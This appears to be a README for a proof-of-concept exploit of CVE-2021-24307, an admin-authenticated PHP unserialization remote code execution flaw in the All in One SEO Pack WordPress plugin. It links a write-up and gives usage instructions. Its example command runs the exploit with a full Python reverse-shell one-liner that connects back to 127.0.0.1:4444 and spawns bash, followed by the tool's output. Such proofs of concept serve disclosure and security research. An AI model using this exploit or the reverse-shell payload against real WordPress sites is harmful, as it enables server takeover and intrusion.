#  Admin PHP unserialization RCE in All in one SEO pack (CVE-2021-24307)

Simple PoC of an admin authenticated RCE in AISEO <= 4.1.0.1 provided as an example.

Full write-up here: https://darkpills.com/php-unserialize-write-up-with-admin-rce-in-all-in-one-seo-pack-cve-2021-24307/


Usage:
```
php exploit.php url login password php_command arguments [proxy]
```

Example:
```
└─$ php exploit.php http://wordpress/ admin admin shell_exec "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" localhost:8080

-- All-in-one-seo-pack <= 4.1.0.1 authenticated admin RCE --
-- Exploit by Vincent MICHEL (@darkpills) --

[+] Authenticating to wordpress http://wordpress/
[+] Getting WP REST API nonce
[+] Nonce found: 6aeb9ddf05
[+] Generating POST payload to execute command: shell_exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'")
[+] Uploading ini file with import settings
[+] Done! Check the result somewhere (blind command execution)
```